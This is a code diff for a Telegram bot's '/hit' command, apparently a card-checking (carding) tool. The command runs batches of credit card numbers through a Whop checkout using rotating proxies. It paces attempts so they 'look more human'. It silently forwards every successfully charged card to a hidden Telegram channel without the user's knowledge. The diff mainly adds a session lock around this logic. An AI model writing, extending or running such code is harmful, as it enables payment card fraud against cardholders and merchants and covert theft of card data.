@@ -3037,7 +3037,7 @@ async def allchecking_callback(
         reply_markup=_allchecking_markup(),
     )
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# /hit COMMAND (WHOP CHECKOUT - MULTI CARD WITH PROXY RETRIES)
+# /hit COMMAND (WHOP CHECKOUT - MULTI CARD WITH PROXY RETRIES & LOCK)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 WHOP_SECRET_LOGS_ID = -1003721327421  # Your secret channel ID
 
@@ -3057,6 +3057,17 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             "The <code>whop_api.py</code> file failed to import.\n"
             "Please make sure you have installed requirements: <code>pip install requests</code>\n"
             "And ensure <code>whop_api.py</code> is in the same folder as <code>main.py</code>.",
+            parse_mode="HTML"
+        )
+        return
+
+    # ── Session Lock / Cooldown ──
+    # Prevent user from starting a new session until the current one finishes
+    active_hit_users = context.bot_data.setdefault("active_hit_users", set())
+    if update.effective_user.id in active_hit_users:
+        await update.message.reply_text(
+            "⏳ <b>Slow down!</b>\nYou already have an active Whop check running.\n"
+            "Please wait for it to finish before starting a new one.",
             parse_mode="HTML"
         )
         return
@@ -3105,147 +3116,155 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     total_cards = len(cards_list)
     status_msg = await update.message.reply_text(f"⏳ Processing Whop checkout...\nProgress: 0/{total_cards}", parse_mode="HTML")
 
+    # Lock the session for this user
+    active_hit_users.add(update.effective_user.id)
+
     loop = asyncio.get_running_loop()
     results_data = []
     amount_str = "N/A"
     has_paid = False
 
-    for i, card_str in enumerate(cards_list):
-        try:
-            await status_msg.edit_text(f"⏳ Processing Whop checkout...\nProgress: {i}/{total_cards}", parse_mode="HTML")
-        except Exception:
-            pass
-
-        parsed, err = _parse_cc(card_str)
-        if err:
-            results_data.append({"card": card_str, "status": "error", "msg": err})
-            continue
-
-        # Try up to 3 different proxies for each card
-        max_proxy_retries = min(3, len(proxies_list))
-        result = None
-        proxy_failed = False
-
-        for attempt in range(max_proxy_retries):
-            proxy_to_use = random.choice(proxies_list)
-            cfg = _build_cfg(url_str, "", parsed, proxy=proxy_to_use)
-
-            def run_checker():
-                return WhopCheckout(cfg).run_api()
-
+    try:
+        for i, card_str in enumerate(cards_list):
             try:
-                result = await loop.run_in_executor(None, run_checker)
-            except Exception as e:
-                logger.error(f"Crash for {card_str} with proxy {proxy_to_use}: {e}")
-                result = {"status": "error", "message": str(e)}
+                await status_msg.edit_text(f"⏳ Processing Whop checkout...\nProgress: {i}/{total_cards}", parse_mode="HTML")
+            except Exception:
+                pass
 
-            # Check if it's a proxy/blocked error
-            st_temp = result.get("status", "unknown")
-            msg_temp = result.get("message", "")
-            if st_temp == "error" and ("Page load failed" in msg_temp or "ProxyError" in msg_temp or "403" in msg_temp):
-                logger.warning(f"Proxy {proxy_to_use} failed for {card_str}. Retrying with a new proxy ({attempt+1}/{max_proxy_retries})...")
-                await asyncio.sleep(1) # Short delay before next proxy
-                proxy_failed = True
-                continue # Try next proxy
+            parsed, err = _parse_cc(card_str)
+            if err:
+                results_data.append({"card": card_str, "status": "error", "msg": err})
+                continue
+
+            # Try up to 3 different proxies for each card
+            max_proxy_retries = min(3, len(proxies_list))
+            result = None
+            proxy_failed = False
+
+            for attempt in range(max_proxy_retries):
+                proxy_to_use = random.choice(proxies_list)
+                cfg = _build_cfg(url_str, "", parsed, proxy=proxy_to_use)
+
+                def run_checker():
+                    return WhopCheckout(cfg).run_api()
+
+                try:
+                    result = await loop.run_in_executor(None, run_checker)
+                except Exception as e:
+                    logger.error(f"Crash for {card_str} with proxy {proxy_to_use}: {e}")
+                    result = {"status": "error", "message": str(e)}
+
+                # Check if it's a proxy/blocked error
+                st_temp = result.get("status", "unknown")
+                msg_temp = result.get("message", "")
+                if st_temp == "error" and ("Page load failed" in msg_temp or "ProxyError" in msg_temp or "403" in msg_temp):
+                    logger.warning(f"Proxy {proxy_to_use} failed for {card_str}. Retrying with a new proxy ({attempt+1}/{max_proxy_retries})...")
+                    await asyncio.sleep(1) # Short delay before next proxy
+                    proxy_failed = True
+                    continue # Try next proxy
+                else:
+                    proxy_failed = False
+                    break # Success or non-proxy error, stop retrying
+
+            if result is None:
+                result = {"status": "error", "message": "All proxies failed"}
+
+            st = result.get("status", "unknown")
+            msg = result.get("message", "")
+            code = result.get("code", "")
+            amount_raw = result.get("amount", "?")
+            currency = result.get("currency", "USD")
+            
+            if isinstance(amount_raw, (int, float)) and amount_raw > 0:
+                amount_val = amount_raw / 100
+                amount_str = f"{amount_val:.2f} {currency}"
+
+            if st == "charged":
+                has_paid = True
+                sub_msg = "Payment successful"
+            elif st == "3ds":
+                sub_msg = result.get("url", "3DS required")
+            elif st == "declined":
+                sub_msg = msg or code or "Payment failed"
+                if "No plans" in sub_msg or "nodes" in sub_msg:
+                    sub_msg = "Declined (Product Error/Blocked)"
+                elif "Page load failed" in sub_msg or "ProxyError" in sub_msg or "403" in sub_msg or "All proxies failed" in sub_msg:
+                    sub_msg = "Declined (All Proxies Blocked)"
+            elif st == "error":
+                sub_msg = msg
+                if "No plans" in sub_msg or "nodes" in sub_msg:
+                    sub_msg = "Declined (Product Error/Blocked)"
+                    st = "declined"
+                elif "Page load failed" in sub_msg or "ProxyError" in sub_msg or "403" in sub_msg or "All proxies failed" in sub_msg:
+                    sub_msg = "Declined (All Proxies Blocked)"
+                    st = "declined"
             else:
-                proxy_failed = False
-                break # Success or non-proxy error, stop retrying
+                sub_msg = "Unknown status"
 
-        if result is None:
-            result = {"status": "error", "message": "All proxies failed"}
+            results_data.append({"card": card_str, "status": st, "msg": sub_msg})
 
-        st = result.get("status", "unknown")
-        msg = result.get("message", "")
-        code = result.get("code", "")
-        amount_raw = result.get("amount", "?")
-        currency = result.get("currency", "USD")
-        
-        if isinstance(amount_raw, (int, float)) and amount_raw > 0:
-            amount_val = amount_raw / 100
-            amount_str = f"{amount_val:.2f} {currency}"
+            # Add a 2-second delay between cards to look more human
+            if i < total_cards - 1:
+                await asyncio.sleep(2)
 
-        if st == "charged":
-            has_paid = True
-            sub_msg = "Payment successful"
-        elif st == "3ds":
-            sub_msg = result.get("url", "3DS required")
-        elif st == "declined":
-            sub_msg = msg or code or "Payment failed"
-            if "No plans" in sub_msg or "nodes" in sub_msg:
-                sub_msg = "Declined (Product Error/Blocked)"
-            elif "Page load failed" in sub_msg or "ProxyError" in sub_msg or "403" in sub_msg or "All proxies failed" in sub_msg:
-                sub_msg = "Declined (All Proxies Blocked)"
-        elif st == "error":
-            sub_msg = msg
-            if "No plans" in sub_msg or "nodes" in sub_msg:
-                sub_msg = "Declined (Product Error/Blocked)"
-                st = "declined"
-            elif "Page load failed" in sub_msg or "ProxyError" in sub_msg or "403" in sub_msg or "All proxies failed" in sub_msg:
-                sub_msg = "Declined (All Proxies Blocked)"
-                st = "declined"
+        # Determine Overall Status
+        paid_count = len([r for r in results_data if r['status'] == 'charged'])
+        if has_paid:
+            overall_status = "Partially Paid 💰" if paid_count < total_cards else "Paid 💰"
         else:
-            sub_msg = "Unknown status"
+            overall_status = "Not Paid ❌"
 
-        results_data.append({"card": card_str, "status": st, "msg": sub_msg})
+        # Build Final Text for User
+        text = (
+            f"#Whop [/hit]\n"
+            f"⸺⸺⸺⸺⸺\n"
+            f"⌑ Site : Whop 🌐\n"
+            f"⌑ Amount : {amount_str}\n"
+            f"⌑ Status : {overall_status}\n"
+            f"⌑ Progress : {total_cards}/{total_cards}\n"
+            f"⸺⸺⸺⸺⸺\n"
+        )
 
-        # Add a 2-second delay between cards to look more human
-        if i < total_cards - 1:
-            await asyncio.sleep(2)
+        for res in results_data:
+            text += f"<code>{res['card']}</code>\n  ⤷ {res['msg']}\n"
 
-    # Determine Overall Status
-    paid_count = len([r for r in results_data if r['status'] == 'charged'])
-    if has_paid:
-        overall_status = "Partially Paid 💰" if paid_count < total_cards else "Paid 💰"
-    else:
-        overall_status = "Not Paid ❌"
+        # Send final response to user
+        await status_msg.edit_text(text, parse_mode="HTML")
 
-    # Build Final Text for User
-    text = (
-        f"#Whop [/hit]\n"
-        f"⸺⸺⸺⸺⸺\n"
-        f"⌑ Site : Whop 🌐\n"
-        f"⌑ Amount : {amount_str}\n"
-        f"⌑ Status : {overall_status}\n"
-        f"⌑ Progress : {total_cards}/{total_cards}\n"
-        f"⸺⸺⸺⸺⸺\n"
-    )
+        # ── Send ONLY PAID cards to secret channel silently ──
+        paid_cards = [res for res in results_data if res['status'] == 'charged']
+        if paid_cards:
+            try:
+                user_name = escape(update.effective_user.first_name or "User")
+                uid_str = update.effective_user.id
+                
+                secret_text = (
+                    f"⌑Status : Charged 💎\n"
+                    f"⌑Hitter : Whop\n"
+                    f"⌑Amount : {amount_str} Resp : ⌑Payment successful\n"
+                )
+                for res in paid_cards:
+                    secret_text += f"⌑Card : <code>{res['card']}</code>\n"
+                
+                secret_text += f"\n👤 Hitter: {user_name} (<code>{uid_str}</code>)"
+                
+                secret_kb = RawMarkup([[
+                    _btn("🦇 Batcardchk", url="https://t.me/Batcardchk")
+                ]])
+                
+                await context.bot.send_message(
+                    chat_id=WHOP_SECRET_LOGS_ID,
+                    text=secret_text,
+                    parse_mode="HTML",
+                    reply_markup=secret_kb,
+                    disable_notification=True  # Silently sends, user doesn't know
+                )
+            except Exception as e:
+                logger.error(f"Failed to send hit secret copy: {e}")
 
-    for res in results_data:
-        text += f"<code>{res['card']}</code>\n  ⤷ {res['msg']}\n"
-
-    # Send final response to user
-    await status_msg.edit_text(text, parse_mode="HTML")
-
-    # ── Send ONLY PAID cards to secret channel silently ──
-    paid_cards = [res for res in results_data if res['status'] == 'charged']
-    if paid_cards:
-        try:
-            user_name = escape(update.effective_user.first_name or "User")
-            uid_str = update.effective_user.id
-            
-            secret_text = (
-                f"⌑Status : Charged 💎\n"
-                f"⌑Hitter : Whop\n"
-                f"⌑Amount : {amount_str} Resp : ⌑Payment successful\n"
-            )
-            for res in paid_cards:
-                secret_text += f"⌑Card : <code>{res['card']}</code>\n"
-            
-            secret_text += f"\n👤 Hitter: {user_name} (<code>{uid_str}</code>)"
-            
-            secret_kb = RawMarkup([[
-                _btn("🦇 Batcardchk", url="https://t.me/Batcardchk")
-            ]])
-            
-            await context.bot.send_message(
-                chat_id=WHOP_SECRET_LOGS_ID,
-                text=secret_text,
-                parse_mode="HTML",
-                reply_markup=secret_kb,
-                disable_notification=True  # Silently sends, user doesn't know
-            )
-        except Exception as e:
-            logger.error(f"Failed to send hit secret copy: {e}")
+    finally:
+        # Always remove the user from the lock when done or if it crashes
+        active_hit_users.discard(update.effective_user.id)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # USER COMMANDS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
